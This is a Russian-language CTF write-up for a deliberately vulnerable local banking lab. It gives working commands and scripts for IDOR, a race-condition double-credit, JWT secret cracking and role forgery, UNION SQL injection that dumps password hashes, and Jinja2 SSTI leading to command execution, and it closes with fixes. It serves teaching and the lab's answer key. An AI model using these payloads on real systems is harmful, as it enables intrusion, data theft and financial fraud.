# BankHack — WRITEUP

Разбор всех этапов CTF-лаборатории BankHack с готовыми командами.

> ⚠️ **Спойлеры.** Файл содержит флаги и полные цепочки эксплуатации. Не читайте его, если хотите пройти лабораторию самостоятельно.
>
> Все команды ниже выполняются **только против стенда, запущенного локально** (`docker compose up --build -d`). Использование этих техник против чужих систем без письменного разрешения незаконно.

## Оглавление

- [0. Подготовка](#0-подготовка)
- [1. IDOR](#1-idor)
- [2. Race Condition (TOCTOU)](#2-race-condition-toctou)
- [3. Подделка JWT](#3-подделка-jwt)
- [4. SQL Injection в админ-панели](#4-sql-injection-в-админ-панели)
- [5. SSTI и чтение флага](#5-ssti-и-чтение-флага)
- [6. Автопроверка всей цепочки](#6-автопроверка-всей-цепочки)
- [7. Итоговые флаги](#7-итоговые-флаги)
- [8. Как исправить уязвимости](#8-как-исправить-уязвимости)

---

## 0. Подготовка

```bash
git clone <repo-url> bankhack
cd bankhack
docker compose up --build -d
```

Приложение: `http://localhost:3000`. API проксируется nginx'ом по префиксу `/api`, поэтому снаружи все эндпоинты видны как `http://localhost:3000/api/...`.

Проверка, что стенд поднялся:

```bash
curl -s http://localhost:3000/api/health
# {"status":"ok","service":"bankhack-backend"}
```

Учётные записи из `init_db.py`:

| ID | Логин | Пароль | Роль | Баланс |
| --- | --- | --- | --- | --- |
| 1 | `user1` | `user1pass` | `user` | `100.00` |
| 2 | `vip_client` | `vippass123` | `vip` | `50000.00` |
| 3 | `admin` | `adminpass123` | `admin` | `100000.00` |

ID пользователей можно проверить в БД:

```bash
docker exec bankhack-db psql -U bankhack -d bankhack -c "SELECT id, username, role FROM users ORDER BY id;"
```

Получаем рабочий токен:

```bash
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"user1","password":"user1pass"}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')

echo "$TOKEN"
```


---

## 1. IDOR

**Где:** `backend/app/main.py:140` — `GET /api/v1/transactions/{user_id}`

Эндпоинт принимает `user_id` из пути и подгружает транзакции по нему, не сверяя с `current_user.id`:

```python
target_user = db.query(User).filter(User.id == user_id).first()
...
txs = db.query(Transaction).filter(
    or_(Transaction.from_id == target_user.id, Transaction.to_id == target_user.id)
).all()
```

**`vip_client` имеет ID = 2.** Пользователи создаются в порядке `user1` → `vip_client` → `admin`, поэтому `admin` получает ID 3, а не VIP-клиент.

Эксплуатация:

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:3000/api/v1/transactions/2 | python3 -m json.tool
```

Для сравнения — собственные транзакции:

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:3000/api/v1/transactions/1 \
  | python3 -c 'import sys,json; print(len(json.load(sys.stdin)))'
```

В ответе для `user_id=2` находим перевод от администратора с комментарием:

```
Кэшбэк VIP Private · Код сброса пароля: VIP-RESET-7392 | BANKHACK{idor_vip_tx_leak}
```

**Флаг этапа 1:** `BANKHACK{idor_vip_tx_leak}`

Там же лежит код сброса пароля `VIP-RESET-7392` — намёк на логическую связку со следующими этапами.

Декодировать payload токена без проверки подписи:

```bash
python3 -c "import jwt,json; print(json.dumps(jwt.decode('$TOKEN', options={'verify_signature': False}), indent=2, default=str))"

---

## 2. Race Condition (TOCTOU)

**Где:** `backend/app/main.py:194` — `POST /api/v1/transfer`

Логика перевода разбита на два независимых запроса с задержкой между ними:

```python
# Шаг 1: чтение баланса БЕЗ блокировки строки
sender_balance = db.query(User.balance).filter(User.id == current_user.id).scalar()
if Decimal(sender_balance) < amount:
    raise HTTPException(400, "Недостаточно средств")

await asyncio.sleep(0.2)   # окно гонки

# Шаг 2: списание по значению, прочитанному на шаге 1
db.execute(update(User).where(User.id == current_user.id).values(balance=sender_balance - amount))
db.execute(update(User).where(User.id == recipient.id).values(balance=User.balance + amount))
```

Ключевая деталь: списание идёт по `sender_balance - amount`, а не по `User.balance - amount`. Все параллельные запросы пишут одно и то же значение, зато зачисление получателю выполняется каждым запросом. Баланс отправителя уменьшается один раз, зачислений происходит N.

### Сценарий для Burp Suite

1. Войдите как `user1`, отправьте один легитимный перевод на `vip_client` (например, 1 ₽) и перехватите запрос:

   ```http
   POST /api/v1/transfer HTTP/1.1
   Host: localhost:3000
   Authorization: Bearer <TOKEN>
   Content-Type: application/json

   {"to_username":"vip_client","amount":20,"comment":"race"}
   ```

2. Правой кнопкой по запросу → **Send to Repeater**.
3. В Repeater создайте группу вкладок: **+** → **New tab group**, затем добавьте 6–10 копий запроса в неё (Duplicate tab).
4. В настройках группы выберите **Send group in parallel (last byte sync)** и нажмите **Send group**.

Все запросы уйдут одновременно и попадут в окно `asyncio.sleep(0.2)`.

Альтернатива без Repeater — расширение **Turbo Intruder** с атакой `race-single-packet-attack` или примитивом `gate`: они дают более плотный синхронный старт.

Для наглядности в Burp удобно включить **Proxy → HTTP history** и убедиться, что все ответы — `201 Created`, а затем сравнить баланс через `GET /api/me`.

### Сценарий на чистом Python

```python
import json, threading, urllib.error, urllib.request

BASE = "http://localhost:3000/api"
TOKEN = "<подставьте токен user1>"


def me():
    req = urllib.request.Request(f"{BASE}/me", headers={"Authorization": f"Bearer {TOKEN}"})
    with urllib.request.urlopen(req) as r:
        return json.load(r)["balance"]


def transfer(barrier, i):
    req = urllib.request.Request(
        f"{BASE}/v1/transfer",
        data=json.dumps(
            {"to_username": "vip_client", "amount": 20, "comment": f"race-{i}"}
        ).encode(),
        headers={"Content-Type": "application/json", "Authorization": f"Bearer {TOKEN}"},
        method="POST",
    )
    barrier.wait()  # синхронный старт всех потоков
    try:
        with urllib.request.urlopen(req) as r:
            print(i, r.status, json.load(r)["amount"])
    except urllib.error.HTTPError as e:
        print(i, e.code, json.load(e)["detail"])


print("before:", me())
N = 6
barrier = threading.Barrier(N)
threads = [threading.Thread(target=transfer, args=(barrier, i)) for i in range(N)]
for t in threads:
    t.start()
for t in threads:
    t.join()
print("after:", me())
```

`threading.Barrier` гарантирует, что все запросы отправятся одновременно, а не последовательно, как при обычном цикле.

### Проверенный результат

Прогон на 6 потоков по 20 ₽ при балансе `89.00`:

```
user1 balance before: 89.00
results: [(0, 201, '20.00'), (1, 201, '20.00'), (2, 201, '20.00'),
          (3, 201, '20.00'), (4, 201, '20.00'), (5, 201, '20.00')]
user1 balance after: 69.00 | vip balance: 50131.00
spent: 20.0
```

Все 6 запросов вернули `201 Created`, с отправителя списано **20 ₽**, получателю зачислено **120 ₽**. Проверка баланса проходит в окне гонки и дальше не контролируется.

Разница `(N − 1) × amount` оседает на счёте получателя; увеличение N и суммы масштабирует эффект. Это классический TOCTOU: check и use разделены по времени и не защищены транзакцией с блокировкой строки.


---

## 3. Подделка JWT

**Где:** `backend/app/config.py:9-11` (секрет) и `backend/app/security.py:99` (`require_admin`)

Секрет подписи задан в конфиге и совпадает со значением из `docker-compose.yml`:

```python
JWT_SECRET: str = os.getenv("JWT_SECRET", "supersecret123")
```

Он же лежит в словаре `backend/wordlist.txt` (первая строка). В реальном проекте такой секрет подбирается по офлайн-бруту перехваченного токена: HS256-подпись проверяется локально, без обращений к серверу.

Кандидаты на подбор — `backend/wordlist.txt`. Минимальный пример проверки:

```python
import hashlib, hmac, base64

token = "<ваш JWT>"
header_b64, payload_b64, signature_b64 = token.split(".")

for candidate in open("backend/wordlist.txt", encoding="utf-8"):
    secret = candidate.strip().encode()
    expected = hmac.new(secret, f"{header_b64}.{payload_b64}".encode(), hashlib.sha256).digest()
    if hmac.compare_digest(expected, base64.urlsafe_b64decode(signature_b64 + "==")):
        print("secret found:", candidate.strip())
        break
```

Либо через `hashcat` (режим 16500 для JWT HS256):

```bash
hashcat -m 16500 token.txt backend/wordlist.txt
```

Найденный секрет — `supersecret123`.

### Почему подделки достаточно

`require_admin` проверяет **клейм из токена**, а не роль в базе данных:

```python
token_role = payload.get("role")
if not isinstance(token_role, str) or token_role.lower() != "admin":
    raise HTTPException(403, "Доступ только для администраторов")

return _load_user_from_subject(payload, db)   # пользователь грузится по sub, роль не сверяется
```

`sub` при этом остаётся валидным (существующий пользователь), поэтому запрос проходит. Достаточно взять собственный токен `user1` и поменять `role`.

### Сниппет

```python
import jwt

user_token = "<токен, полученный через /api/auth/login>"

payload = jwt.decode(user_token, options={"verify_signature": False})
payload["role"] = "admin"

admin_token = jwt.encode(payload, "supersecret123", algorithm="HS256")
print(admin_token)
```

Готовый однострочник с логином:

```bash
ADMIN_TOKEN=$(python3 - <<'PY'
import json, urllib.request, jwt

req = urllib.request.Request(
    "http://localhost:3000/api/auth/login",
    data=json.dumps({"username": "user1", "password": "user1pass"}).encode(),
    headers={"Content-Type": "application/json"},
    method="POST",
)
token = json.load(urllib.request.urlopen(req))["access_token"]
payload = jwt.decode(token, options={"verify_signature": False})
payload["role"] = "admin"
print(jwt.encode(payload, "supersecret123", algorithm="HS256"))
PY
)

echo "$ADMIN_TOKEN"
```

Проверка, что роль действительно повышена:

```bash
curl -s -X POST http://localhost:3000/api/admin/export \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"search": ""}' | python3 -m json.tool | head -20
```

С токеном `user1` тот же запрос вернёт `403 {"detail":"Доступ только для администраторов"}` — эндпоинт закрыт корректно, обходится именно подпись.

### Скрытая админ-панель

Фронтенд (`frontend/src/App.jsx`) разбирает payload токена и показывает страницу `/admin` только при `role === "admin"`. Ссылка «Админ-панель» в кабинете появляется по тому же условию. Это **исключительно UI-ограничение**: без подделанного токена страница откроется по прямому URL, но покажет заглушку 403, а запросы к API всё равно будут отклонены.

С подделанным `ADMIN_TOKEN` панель доступна по адресу `http://localhost:3000/admin` и содержит форму поиска клиентов и генерации выписок.


---

## 4. SQL Injection в админ-панели

**Где:** `backend/app/main.py:286` (шаблон запроса) и `:322` (`_run_admin_export`)

Эндпоинт: **`POST /api/admin/export`** (в коде также зарегистрирован алиас `/admin/export` без префикса `/api`, но снаружи через nginx доступен именно `/api/admin/export`). Параметр `v1` в пути **отсутствует** — не путайте с `/api/v1/transfer` и `/api/v1/transactions/{id}`.

Уязвимый код:

```python
SQL_INJECTION_QUERY = (
    "SELECT id, username, role, balance FROM users "
    "WHERE username ILIKE '%{search}%' OR role ILIKE '%{search}%' "
    "ORDER BY id"
)

query = SQL_INJECTION_QUERY.format(search=search)   # конкатенация, без параметризации
result = db.execute(text(query))
```

`search` подставляется в `ILIKE '%...%'` напрямую. При ошибке БД эндпоинт возвращает текст исключения и сам SQL — это упрощает подбор payload'а.

### Базовая эксплуатация

```bash
curl -s -X POST http://localhost:3000/api/admin/export \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"search": "%'"'"' UNION SELECT id, username, role, balance FROM users -- "}' \
  | python3 -m json.tool
```

`$ADMIN_TOKEN` — токен из [раздела 3](#3-подделка-jwt).

Ответ содержит фактически выполненный запрос:

```
SELECT id, username, role, balance FROM users
WHERE username ILIKE '%%' UNION SELECT id, username, role, balance FROM users -- %'
   OR role ILIKE '%%' UNION SELECT id, username, role, balance FROM users -- %'
ORDER BY id
```

и строки:

```json
["user1", "vip_client", "admin"]
```

### Чтение произвольных данных

PostgreSQL позволяет читать системные каталоги и версию. Так как UNION требует совпадения числа и типов колонок (4 колонки: `int, text, text, numeric`), удобно вытаскивать данные в текстовые поля:

```bash
curl -s -X POST http://localhost:3000/api/admin/export \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"search": "%'"'"' UNION SELECT 1, current_user, version(), 0 -- "}' \
  | python3 -c 'import sys,json; [print(r) for r in json.load(sys.stdin)["rows"]]'
```

Чтение хэшей паролей. Третья колонка маппится в поле `role`, поэтому bcrypt-хэш приходит именно туда:

```bash
curl -s -X POST http://localhost:3000/api/admin/export \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"search": "%'"'"' UNION SELECT id, username, password_hash::text, balance FROM users -- "}' \
  | python3 -c 'import sys,json; [print(r["username"], "->", r["role"]) for r in json.load(sys.stdin)["rows"]]'
```

Фактический вывод:

```
admin -> $2b$12$fEt4j6TKLCQ9d...
vip_client -> $2b$12$7AtMiNNgYus9p...
user1 -> $2b$12$0270eTC8HcAtR...
```

> Поле `role` в ответе — это третья колонка SELECT'а. Если подставить туда не роль, а другое значение, оно окажется в `role`. При несовпадении типов эндпоинт вернёт `400` с полями `detail.error` и `detail.query` — по тексту ошибки уточняется payload.

### Альтернатива: boolean/error-based

Инъекция также пригодна для слепого извлечения через деление на ноль, но при наличии ошибок БД в ответе проще пользоваться error-based подходом: подставляйте заведомо некорректное выражение и читайте `detail.error`.

---

## 5. SSTI и чтение флага

**Где:** `backend/app/main.py:313` (`_render_admin_comment`), поле `template` в запросе

Рендер шаблона выполняется без песочницы и без автоэкранирования:

```python
def _render_admin_comment(template_source: str, search: str) -> str:
    env = jinja2.Environment(autoescape=False)          # не SandboxedEnvironment
    return env.from_string(template_source).render(search=search, generated_at=...)
```

`jinja2.Environment` даёт доступ к встроенным глобалам, а через них — к Python-модулям и `os`. Это уже не «SSTI на уровне выражений», а полноценный RCE в контейнере бэкенда.

### Чтение флага

```bash
curl -s -X POST http://localhost:3000/api/admin/export \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"search": "", "template": "{{ cycler.__init__.__globals__.os.popen('"'"'cat /app/flag.txt'"'"').read() }}"}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["rendered_comment"].strip())'
```

Вывод:

```
CTF{b4nk_l0g1c_pwn3d}
```

Файл флага кладётся в образ бэкенда директивой `COPY flag.txt /app/flag.txt` (`backend/Dockerfile:14`), поэтому достижим только после получения RCE в контейнере.

### Проверенные альтернативные payload'ы

```jinja2
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('ls -la /app').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /app/flag.txt').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

Последний полезен для разведки: он показывает список доступных подклассов, среди которых ищется `subprocess.Popen` или `os._wrap_close`, если прямой путь через глобалы почему-то недоступен.

### Через интерфейс

Тот же результат достижим через UI: откройте `http://localhost:3000/admin` с подделанным токеном, введите payload в поле «Шаблон комментария к выписке» и нажмите «Сформировать выписку». Результат рендера отображается в блоке «Комментарий к выписке».


---

## 6. Автопроверка всей цепочки

В репозитории есть скрипт, который проходит весь Этап 3 целиком:

```bash
python3 scripts/ctf_stage3_check.py
```

Требования: поднятый стек (`docker compose up --build -d`) и установленный `PyJWT` (`pip install PyJWT`).

Скрипт выполняет:

1. логин `user1` и получение обычного токена;
2. проверку, что `POST /api/admin/export` с ролью `user` возвращает `403`;
3. переподпись токена секретом `supersecret123` с `role=admin`;
4. SQL-инъекцию в параметре `search`;
5. SSTI в параметре `template` с чтением `/app/flag.txt`.

Ожидаемый вывод:

```
[OK ] логин user1 — HTTP 200
[OK ] admin/export с ролью user отклонён — HTTP 403
[OK ] admin/export с поддельным токеном — HTTP 200
[OK ] выборка не пустая
[OK ] SQL Injection — rows=['admin', 'vip_client', 'user1']
[OK ] SSTI читает flag.txt — rendered='CTF{b4nk_l0g1c_pwn3d}'

Все проверки Этапа 3 пройдены.
```

Код возврата `0` — все проверки прошли, `1` — есть провалы. Можно указать другой адрес стенда:

```bash
python3 scripts/ctf_stage3_check.py --base http://127.0.0.1:3000/api
```

---

## 7. Итоговые флаги

| Этап | Уязвимость | Флаг |
| --- | --- | --- |
| 1 | IDOR, `GET /api/v1/transactions/2` | `BANKHACK{idor_vip_tx_leak}` |
| 2 | Race Condition, `POST /api/v1/transfer` | *флага нет — цель увеличить баланс за счёт двойного зачисления* |
| 3 | Слабый JWT + SQLi + SSTI, `POST /api/admin/export` | `CTF{b4nk_l0g1c_pwn3d}` |

Сводная цепочка: перебор секрета JWT → повышение роли → доступ к `/admin` → SQLi для разведки → SSTI для RCE → чтение `/app/flag.txt`.

---

## 8. Как исправить уязвимости

Материал полезен только тогда, когда понятно, как закрыть каждую дыру. Ниже — минимальные правки для «безопасной» версии стенда.

**IDOR** (`backend/app/main.py:140`). Проверять владельца до выборки:

```python
if target_user.id != current_user.id and current_user.role != "admin":
    raise HTTPException(403, "Доступ запрещён")
```

**Race Condition** (`backend/app/main.py:194`). Один запрос с блокировкой строки и проверкой в транзакции:

```python
sender = (
    db.query(User)
    .filter(User.id == current_user.id)
    .with_for_update()
    .one()
)
if Decimal(sender.balance) < amount:
    raise HTTPException(400, "Недостаточно средств")
sender.balance = Decimal(sender.balance) - amount
recipient.balance = Decimal(recipient.balance) + amount
db.commit()
```

Дополнительно убирают `asyncio.sleep` и переносят логику в один `UPDATE ... WHERE balance >= :amount`.

**Слабый JWT** (`backend/app/config.py:9`). Секрет генерируют криптостойко (≥32 байта) и хранят в секрет-менеджере; роль берут из БД, а не из токена:

```python
user = _load_user_from_subject(payload, db)
if user.role != "admin":
    raise HTTPException(403, "Доступ только для администраторов")
```

Плюс — короткий `exp`, ротация ключей и `jti` для отзыва.

**SQL Injection** (`backend/app/main.py:286`). Параметризованный запрос вместо конкатенации:

```python
result = db.execute(
    text(
        "SELECT id, username, role, balance FROM users "
        "WHERE username ILIKE :pattern OR role ILIKE :pattern ORDER BY id"
    ),
    {"pattern": f"%{search}%"},
)
```

**SSTI** (`backend/app/main.py:295`). Не рендерить пользовательский ввод как шаблон вообще. Если шаблоны нужны — `jinja2.sandbox.SandboxedEnvironment` с белым списком переменных и `autoescape=True`:

```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment(autoescape=True)
template = env.from_string("Выписка для клиента: {{ search }}")  # шаблон фиксирован в коде
return template.render(search=search)
```

**Общее.** Убрать `flag.txt` из образа, вынести уязвимые эндпоинты за отдельный флаг сборки, добавить rate limiting на логин и `/admin/export`, включить аудит-лог обращений к админ-эндпоинтам.

```
